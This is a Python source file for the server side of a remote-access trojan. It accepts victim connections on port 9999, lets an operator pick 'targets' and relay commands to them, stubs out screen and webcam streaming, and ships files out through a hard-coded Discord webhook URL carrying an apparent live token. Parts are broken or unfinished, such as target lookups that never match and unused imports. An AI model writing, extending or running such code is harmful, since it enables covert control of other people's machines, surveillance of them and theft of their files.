import sys
import socket
import threading
import os
from PyQt5.QtWidgets import QApplication, QMainWindow, QVBoxLayout, QLabel, QWidget
import cv2
import discord
from discord_webhook import DiscordWebhook

# Global variables to keep track of the connected clients and targets
clients = {}
current_target = None

# Create server socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(('0.0.0.0', 9999))
server_socket.listen(5)

# Define a function to handle client connections
def handle_client(client_socket, client_address):
    global current_target
    print(f'[*] Client {client_address} connected.')
    clients[client_address] = client_socket
    if len(clients) == 1:
        current_target = client_address
    try:
        while True:
            command = client_socket.recv(1024).decode('utf-8').strip()
            if command.startswith('!stream'):
                if current_target:
                    start_streaming(current_target)
            elif command.startswith('!list'):
                list_clients()
            elif command.startswith('!set target'):
                set_target(command.split(' ')[2])
            elif command.startswith('!remove target'):
                remove_target(command.split(' ')[2])
            elif command.startswith('!download'):
                filename = command.split(' ')[1]
                download_file(filename)
            else:
                print(f"[*] Command received: {command}")
                if current_target:
                    clients[current_target].send(command.encode('utf-8'))
            if command.lower() == 'exit':
                break
    except Exception as e:
        print(f"Error: {e}")
    finally:
        print(f'[*] Client {client_address} disconnected.')
        del clients[client_address]
        client_socket.close()

def start_streaming(target_ip):
    print(f"[*] Starting streaming for {target_ip}...")
    # Placeholder for actual streaming code (screen/webcam capture)

def list_clients():
    for client_ip in clients:
        print(f"[*] Client IP: {client_ip}")
    if current_target:
        print(f"[*] Selected target: {current_target}")

def set_target(target_ip):
    global current_target
    if target_ip in clients:
        current_target = target_ip
        print(f"[*] Target set to {target_ip}")
    else:
        print(f"[*] Client {target_ip} not found")

def remove_target(target_ip):
    global current_target
    if current_target == target_ip:
        current_target = None
        print(f"[*] Target {target_ip} removed")
    else:
        print(f"[*] {target_ip} is not the current target")

def download_file(filename):
    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2', content=f"File received: {filename}")
    with open(filename, 'rb') as file:
        webhook.add_file(file=file, filename=filename)
    webhook.execute()
    print("[*] Sending file...")
    print("[+] Sent!")

def server_loop():
    while True:
        client_socket, client_address = server_socket.accept()
        client_handler = threading.Thread(target=handle_client, args=(client_socket, client_address))
        client_handler.start()

# Start the server loop
server_loop()
